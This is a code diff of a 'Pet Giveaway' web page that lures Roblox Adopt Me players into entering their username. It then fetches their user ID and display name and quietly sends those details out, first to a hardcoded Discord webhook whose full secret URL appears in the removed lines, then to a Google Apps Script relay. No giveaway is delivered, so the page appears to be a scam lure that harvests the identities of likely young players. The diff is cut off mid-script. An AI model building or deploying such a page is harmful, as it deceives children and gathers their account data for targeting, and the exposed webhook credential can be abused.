@@ -6,50 +6,34 @@
   <title>Pet Giveaway</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: Arial;
       text-align: center;
       padding: 20px;
-      background-color: #f0f0f0;
     }
     .pet {
       display: inline-block;
       margin: 10px;
       cursor: pointer;
-      border: 2px solid transparent;
-      transition: transform 0.2s;
-    }
-    .pet img {
-      width: 100px;
-      height: 100px;
-      border-radius: 10px;
     }
     .pet.selected {
       border: 2px solid green;
-      transform: scale(1.05);
     }
     #confirmation {
       display: none;
-      margin-top: 20px;
-      font-weight: bold;
       color: green;
+      margin-top: 20px;
     }
-    #confirmation img {
+    #avatar {
       margin-top: 10px;
     }
   </style>
-
-  <!-- 🔽 Open Graph Meta for thumbnail preview -->
-  <meta property="og:title" content="Pet Giveaway" />
-  <meta property="og:description" content="Join the Adopt Me Pet Giveaway! Choose your favorite pet and enter your Roblox username." />
-  <meta property="og:image" content="https://i.ytimg.com/vi/fGWSgo6WnCc/hq720.jpg" />
 </head>
 <body>
-
   <h1>🎁 Pet Giveaway</h1>
-  <p>Click your favorite pet and enter your Roblox username to join!</p>
+  <p>Click your favorite pet and enter your Roblox username!</p>
 
   <h3>Choose Your Pet</h3>
-  <div id="petList">
+  <div class="pets" id="petList">
     <div class="pet" data-name="Raccoon">
       <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRDpb6oYHh0OnNavALI-aLfRiHUO3vM6heMQQ&s" alt="Raccoon"><br>Raccoon
     </div>
@@ -69,7 +53,10 @@
   <br><br>
   <button onclick="verifyUser()">Enter Giveaway</button>
 
-  <div id="confirmation"></div>
+  <div id="confirmation">
+    ✅ Verified! You've entered the giveaway.
+    <div id="avatar"></div>
+  </div>
 
   <script>
     const petDivs = document.querySelectorAll('.pet');
@@ -91,64 +78,33 @@
       }
 
       try {
-        const res = await fetch("https://users.roblox.com/v1/usernames/users", {
+        // Step 1: Get User ID & Display Name
+        const res = await fetch(`https://users.roblox.com/v1/usernames/users`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ usernames: [username], excludeBannedUsers: true })
         });
-
         const data = await res.json();
+
         if (!data || !data.data || data.data.length === 0) {
           alert("Username not found.");
           return;
         }
 
-        const user = data.data[0];
-        const userId = user.id;
-        const displayName = user.displayName;
+        const userInfo = data.data[0];
+        const userId = userInfo.id;
+        const displayName = userInfo.displayName;
 
-        const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=true`);
-        const thumbData = await thumbRes.json();
-        const avatarUrl = thumbData.data[0]?.imageUrl;
-
-        // ✅ Your real Discord webhook URL here:
-        const webhookUrl = "https://discord.com/api/webhooks/1305395577650937877/anagV_7i2jzKBT87zSay-9zzDniVsyb2bLhMtY6jgFloayQ40P6ugSLbLVTDJYCMOn3T";
-
-        await fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            embeds: [{
-              title: "🎉 New Giveaway Entry!",
-              thumbnail: { url: avatarUrl },
-              fields: [
-                { name: "Roblox Display Name", value: displayName, inline: true },
-                { name: "Roblox Username", value: username, inline: true },
-                { name: "User ID", value: userId.toString(), inline: false },
-                { name: "Selected Pet", value: selectedPet, inline: true }
-              ],
-              color: 0x00ff99
-            }]
-          })
-        });
-
-        // Show confirmation to user
-        document.getElementById('confirmation').style.display = "block";
-        document.getElementById('confirmation').innerHTML = `
-          ✅ Verified! You've entered the giveaway.<br>
-          <img src="${avatarUrl}" alt="Avatar" width="100" height="100"><br>
-          <strong>${displayName}</strong> (${username})
+        // Step 2: Show Avatar
+        const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
+        document.getElementById('avatar').innerHTML = `
+          <p><strong>${displayName}</strong> (${username})</p>
+          <img src="${avatarUrl}" alt="Avatar"/>
         `;
-      } catch (err) {
-        console.error("Error:", err);
-        alert("Something went wrong. Please check your connection or try again.");
-      }
-    }
-  </script>
-</body>
-</html>
+
+        // Step 3: Send to Webhook (Google Apps Script / Discord)
+        const webhookRelay = "https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec"; // change this
+
         await fetch(webhookRelay, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
